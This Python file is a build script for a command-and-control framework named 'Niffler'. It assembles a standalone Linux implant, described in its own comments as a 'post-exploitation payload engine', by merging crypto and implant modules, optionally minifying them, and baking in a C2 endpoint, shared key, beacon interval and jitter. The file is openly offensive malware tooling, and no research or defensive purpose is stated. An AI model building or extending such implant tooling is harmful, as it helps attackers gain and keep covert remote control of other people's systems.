import logging
import re
import tokenize
import io
from pathlib import Path

import yaml

logger = logging.getLogger(__name__)


def _obfuscate_source(source: str) -> str:
    """Apply a lightweight source minification/obfuscation pass for CI builds."""
    tokens = tokenize.generate_tokens(io.StringIO(source).readline)
    output = []
    last_token_type = None
    for token in tokens:
        token_type, token_text, start, end, line = token
        if token_type == tokenize.COMMENT:
            continue
        if token_type == tokenize.NL and last_token_type in (tokenize.NEWLINE, tokenize.NL):
            continue
        output.append(token_text)
        last_token_type = token_type
    return "".join(output).replace("\n", "\n")


def compile_implant(output_path: str | Path = "dist/niffler_agent.py", config_overrides: dict | None = None, obfuscate: bool = False) -> Path:
    """Build a standalone implant payload and return the generated file path."""
    project_root = Path(__file__).resolve().parent.parent
    output_path = Path(output_path).expanduser()
    output_path = output_path if output_path.is_absolute() else project_root / output_path

    logger.info("Launching Niffler automated build matrix")

    config_file = project_root / "backend" / "config.yaml"
    crypto_file = project_root / "common" / "crypto_utils.py"
    implant_file = project_root / "implant" / "implant.py"

    if not all(path.exists() for path in (config_file, crypto_file, implant_file)):
        raise FileNotFoundError("Missing required build inputs: config.yaml, crypto_utils.py, or implant.py")

    with config_file.open("r", encoding="utf-8") as f:
        config = yaml.safe_load(f) or {}

    if config_overrides:
        config.update({key: value for key, value in config_overrides.items() if value not in (None, "")})

    logger.info("Compiling payload for endpoint %s", config.get("c2_endpoint"))

    crypto_code = crypto_file.read_text(encoding="utf-8")
    implant_code = implant_file.read_text(encoding="utf-8")

    # 3. Strip internal project import structures
    implant_code = re.sub(r"sys\.path\.append\(.*?\)", "", implant_code)
    implant_code = re.sub(r"from common\.crypto_utils import.*", "", implant_code)

    if obfuscate:
        crypto_code = _obfuscate_source(crypto_code)
        implant_code = _obfuscate_source(implant_code)

    # 4. Patch build-time tokens with configuration values
    implant_code = implant_code.replace("{{BUILD_SHARED_KEY}}", config.get("shared_key", ""))
    implant_code = implant_code.replace("{{BUILD_C2_ENDPOINT}}", config.get("c2_endpoint", ""))
    implant_code = implant_code.replace("{{BUILD_BEACON_INTERVAL}}", str(config.get("beacon_interval", 15)))
    implant_code = implant_code.replace("{{BUILD_JITTER}}", str(config.get("jitter", 3)))

    # 5. Assemble unified independent payload script
    output_path.parent.mkdir(parents=True, exist_ok=True)
    
    compiled_source = f"""# -*- coding: utf-8 -*-
# Automatically generated post-exploitation payload engine.
# Targets generic Linux environments with ZERO external pip dependencies.

{crypto_code}

# --- EXTRACTED CORE IMPLANT ENGINE ---
{implant_code}
"""
    compiled_source = compiled_source.replace("import crypto_utils", "")

    output_path.write_text(compiled_source, encoding="utf-8")

    logger.info("Build success: %s (%0.2f KB)", output_path, output_path.stat().st_size / 1024)
    return output_path

if __name__ == "__main__":
    compile_implant()
